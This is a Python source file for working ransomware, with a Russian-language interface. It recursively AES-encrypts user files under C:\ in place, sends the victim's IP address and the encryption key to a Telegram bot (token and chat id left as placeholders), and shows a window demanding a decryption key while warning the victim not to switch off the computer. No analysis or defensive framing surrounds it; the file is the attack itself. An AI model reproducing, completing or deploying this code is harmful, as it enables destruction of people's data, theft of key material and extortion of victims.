import os
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket
import requests
import tkinter as tk

salt = get_random_bytes(16)
password = "YOUR_PASSW"
key = PBKDF2(password, salt, dkLen=32)
ip = socket.gethostbyname(socket.gethostname())

def send(text):
    token = "TOKEN_TG"
    chat_id = "CHAT_ID"
    url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text
    requests.get(url_req)

def is_system_file_or_dir(path):
    system_files_and_dirs = ["Windows", "Program Files", "Program Files (x86)", "ProgramData", "Perflogs", "AppData", "Public", "Default", "All Users", "$Recycle.Bin"]
    for system_item in system_files_and_dirs:
        if system_item.lower() in path.lower():
            return True
    return False


def encode(directory):
    for item in os.scandir(directory):
        try:
            if os.access(item.path, os.R_OK) and os.access(item.path, os.W_OK) and not is_system_file_or_dir(item.path):
                if item.is_file():
                    cipher = AES.new(key, AES.MODE_CBC)
                    with open(item.path, "rb") as f:
                        plaintext = f.read()
                    ciphertext = cipher.iv + cipher.encrypt(pad(plaintext, AES.block_size))
                    with open(item.path, "wb") as f:
                        f.write(ciphertext)
                elif item.is_dir() and not is_system_file_or_dir(item.path):
                    if not os.path.ismount(item.path):
                        encode(item.path)
        except Exception:
            pass
            continue

def decode(directory):
    for item in os.scandir(directory):
        try:
            if os.access(item.path, os.R_OK) and os.access(item.path, os.W_OK) and not is_system_file_or_dir(item.path):
                if item.is_file():
                    with open(item.path, "rb") as f:
                        ciphertext = f.read()
                    iv = ciphertext[:AES.block_size]
                    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                    decrypted_data = unpad(cipher.decrypt(ciphertext[AES.block_size:]), AES.block_size)
                    with open(item.path, "wb") as f:
                        f.write(decrypted_data)
                elif item.is_dir() and not is_system_file_or_dir(item.path):
                    if not os.path.ismount(item.path):
                        decode(item.path)
        except Exception:
            pass
            continue

def process_input():
    text = entry.get().encode('utf-8').decode('unicode_escape').encode('latin1')
    if text == key:
        label.config(text="Ключ верный, дешифрование выполняется.")
        decode("C:\\")
    else:
        label.config(text="Неверный ключ, дешифрование не выполнено.")

def create_window():
    root = tk.Tk()
    root.title("Дешифрование файлов")

    label1 = tk.Label(root, text="Не выключайте компьютер или данные не получится восстановить")
    label1.pack(pady=10)

    label2 = tk.Label(root, text="Введите ключ для дешифрования:")
    label2.pack(pady=10)

    global entry, label
    entry = tk.Entry(root)
    entry.pack(pady=5)

    button = tk.Button(root, text="Дешифровать", command=process_input)
    button.pack(pady=5)

    label = tk.Label(root, text="")
    label.pack()

    root.mainloop()


if __name__ == '__main__':
    try:
        encode("C:\\")
        send(f"Ip: {ip}, Key: {key}")
        create_window()
    except Exception:
        pass

